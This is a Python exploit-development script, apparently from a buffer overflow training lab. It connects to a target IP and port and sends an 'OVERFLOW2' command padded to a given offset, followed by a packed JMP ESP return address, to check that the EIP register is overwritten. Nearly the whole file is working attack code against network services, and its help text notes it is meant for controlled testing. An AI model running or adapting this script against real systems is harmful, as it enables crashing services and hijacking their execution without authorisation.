#!/usr/bin/env python3

import sys
import subprocess
import socket
import argparse
import itertools
import struct
from typing import Optional

def main(ip: str, port: int, eip_offset: int, overflow_threshold: int, jmp_address: hex) -> None:
	# Define prefix and buffer
	prefix = b"OVERFLOW2 "	# CHANGE
	buffer = b"A" * eip_offset
	eip = struct.pack('<I', jmp_address)
	
	payload = b""
	payload_size = eip_offset + len(eip)

	if payload_size > overflow_threshold:
		print("The Overflow Threshold is too small, it should have a minimum value of:", eip_offset + len(eip))
		sys.exit(0)

	suffix = b"C" * (overflow_threshold - payload_size)

	timeout = 5
	try:
		# Create socket object
		with socket.socket() as s:
			# Connect to target server
			s.connect((ip, port))

			# Set Timeout
			#s.settimeout(timeout)

			# Print server banner
			try:
				response = s.recv(4096)
				print(f"{response.decode()}")
			except:
				pass

			# Send data to the server
			payload = b"".join(
				[
					prefix,
					buffer,
					eip,
					suffix
				]
			)
			print(f"Sending payload...")
			s.send(payload)

			response = s.recv(4096)
			# Print the response from the server
			print(f"Response: {response.decode()}")

	except ConnectionError:
		print('Connection Refused')
		sys.exit(0)
	except:
		print("\n","="*25,"CRASH","="*25,"\n")
		print(f"Application crashed at {len(payload) - len(prefix)} bytes!")
		sys.exit(0)

if __name__ == "__main__":
	# Parse command line arguments
	parser = argparse.ArgumentParser(
		prog="Jump Pointer",
		description="""This is a Python script for checking if we our eip is being filled with the jmp pointer we passed as an argument. 
	The script takes five arguments: an IP address, a port number, the EIP offset, an overflow threshold and the address to the JMP ESP instruction. After executing the script the EIP register should be populated with the value we uncovered with the previous scripts.
	It is intended for use in a controlled testing environment and should not be used to target production systems or networks without proper authorization.""",
		epilog="Have fun experimenting with this tool!"
	)
	parser.add_argument("ip", help="IP address of the target")
	parser.add_argument("port", type=int, help="Port number of the target")
	parser.add_argument("offset", help="Number of bytes inside the buffer until reaching the return address")
	parser.add_argument("overflow_threshold", help="Payload size which is able to crash the target application")
	parser.add_argument("jmp_esp", help="Address of the JMP ESP instruction we uncovered with Mona (ex: 0x625011AF)")
	args = parser.parse_args()

	# Call main function
	main(args.ip, args.port, int(args.offset), int(args.overflow_threshold), int(args.jmp_esp,16))